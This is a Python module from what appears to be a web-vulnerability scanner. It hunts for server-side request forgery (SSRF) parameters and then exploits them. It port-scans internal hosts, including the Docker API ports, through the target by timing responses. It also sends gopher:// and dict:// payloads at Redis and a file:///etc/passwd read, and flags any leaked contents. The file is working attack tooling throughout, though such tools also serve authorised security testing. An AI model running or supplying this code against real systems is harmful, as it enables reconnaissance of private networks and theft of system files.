"""Blind SSRF Oracle — time/error-based blind SSRF with internal port scanning."""

import aiohttp
import asyncio
import time
from urllib.parse import urljoin
from modules.core import console

SSRF_PARAMS = ['url', 'uri', 'path', 'redirect', 'next', 'callback', 'file',
               'load', 'src', 'img', 'page', 'host', 'fetch', 'proxy', 'dest']

INTERNAL_TARGETS = [
    ('127.0.0.1', [80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 9200, 27017]),
    ('10.0.0.1', [80, 443, 8080, 22]),
    ('172.17.0.1', [80, 2375, 2376]),
    ('192.168.1.1', [80, 443, 8080]),
]

SERVICE_FINGERPRINTS = {
    80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 3306: 'MySQL', 5432: 'PostgreSQL',
    6379: 'Redis', 9200: 'Elasticsearch', 27017: 'MongoDB', 8080: 'HTTP-Alt',
    2375: 'Docker API', 2376: 'Docker TLS', 8443: 'HTTPS-Alt', 3000: 'Node/Grafana',
    5000: 'Flask/Registry', 8888: 'Jupyter', 9090: 'Prometheus', 15672: 'RabbitMQ',
}


async def _blind_ssrf_timing(session, url, param, target, baseline_time):
    """Test blind SSRF via timing differential."""
    try:
        start = time.time()
        async with session.get(url, params={param: target},
                               timeout=aiohttp.ClientTimeout(total=15), ssl=False) as resp:
            elapsed = time.time() - start
            return {
                'elapsed': elapsed, 'status': resp.status,
                'size': len(await resp.text()),
                'is_open': elapsed < baseline_time * 0.7,
                'is_closed': elapsed > baseline_time * 1.5,
            }
    except asyncio.TimeoutError:
        return {'elapsed': 15, 'status': 0, 'is_open': False, 'is_closed': True}
    except Exception:
        return None


async def _discover_ssrf_params(session, url):
    """Find which params accept URL-like input."""
    viable = []
    for param in SSRF_PARAMS:
        try:
            async with session.get(url, params={param: 'http://127.0.0.1'},
                                   timeout=aiohttp.ClientTimeout(total=6), ssl=False) as resp:
                body = await resp.text()
                if resp.status != 400 and 'invalid' not in body.lower()[:100]:
                    viable.append(param)
        except Exception:
            pass
    return viable


async def _internal_port_scan(session, url, param):
    """Use blind SSRF for internal port scanning."""
    findings = []
    closed_target = 'http://192.0.2.1:1'
    baseline = await _blind_ssrf_timing(session, url, param, closed_target, 5)
    if not baseline:
        return findings
    base_time = baseline['elapsed']

    for host, ports in INTERNAL_TARGETS:
        for port in ports:
            target = f'http://{host}:{port}'
            result = await _blind_ssrf_timing(session, url, param, target, base_time)
            if not result:
                continue

            if result['is_open']:
                service = SERVICE_FINGERPRINTS.get(port, 'Unknown')
                findings.append({
                    'type': f'Internal Port Open: {host}:{port} ({service})',
                    'severity': 'Critical',
                    'timing': round(result['elapsed'], 2),
                    'baseline': round(base_time, 2),
                })
            elif result['status'] not in (0, 400) and result['elapsed'] < base_time * 0.5:
                service = SERVICE_FINGERPRINTS.get(port, 'Unknown')
                findings.append({
                    'type': f'Possible: {host}:{port} ({service})',
                    'severity': 'High',
                    'timing': round(result['elapsed'], 2),
                })
    return findings


async def _test_protocol_smuggle(session, url, param):
    """Test protocol smuggling via SSRF."""
    findings = []
    protocols = [
        ('gopher://127.0.0.1:6379/_INFO', 'Gopher→Redis'),
        ('dict://127.0.0.1:6379/info', 'Dict→Redis'),
        ('file:///etc/passwd', 'File Read'),
        ('ftp://127.0.0.1', 'FTP Internal'),
        ('ldap://127.0.0.1', 'LDAP Internal'),
    ]
    for payload, desc in protocols:
        try:
            async with session.get(url, params={param: payload},
                                   timeout=aiohttp.ClientTimeout(total=6), ssl=False) as resp:
                body = await resp.text()
                if any(k in body for k in ['root:', 'redis_version', 'ERR', 'uid=', 'drwx']):
                    findings.append({
                        'type': f'Protocol Smuggle: {desc}',
                        'severity': 'Critical',
                        'payload': payload[:40],
                        'evidence': body[:80],
                    })
        except Exception:
            pass
    return findings


async def scan_blind_ssrf(session, url):
    console.print(f"\n[bold cyan]--- Blind SSRF Oracle ---[/bold cyan]")
    all_findings = []

    console.print(f"  [cyan]Discovering SSRF-viable params ({len(SSRF_PARAMS)})...[/cyan]")
    viable = await _discover_ssrf_params(session, url)
    console.print(f"  [dim]Viable params: {viable or 'none'}[/dim]")

    for param in viable[:3]:
        console.print(f"  [cyan]Internal port scan via ?{param} ({sum(len(p) for _, p in INTERNAL_TARGETS)} ports)...[/cyan]")
        ports = await _internal_port_scan(session, url, param)
        all_findings.extend(ports)
        for f in ports:
            console.print(f"  [bold red]⚠ {f['type']}[/bold red]")

        console.print(f"  [cyan]Protocol smuggling via ?{param}...[/cyan]")
        proto = await _test_protocol_smuggle(session, url, param)
        all_findings.extend(proto)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} blind SSRF vectors![/bold red]")
    else:
        console.print(f"\n  [green]✓ No blind SSRF detected[/green]")
    return {'viable_params': viable, 'findings': all_findings}
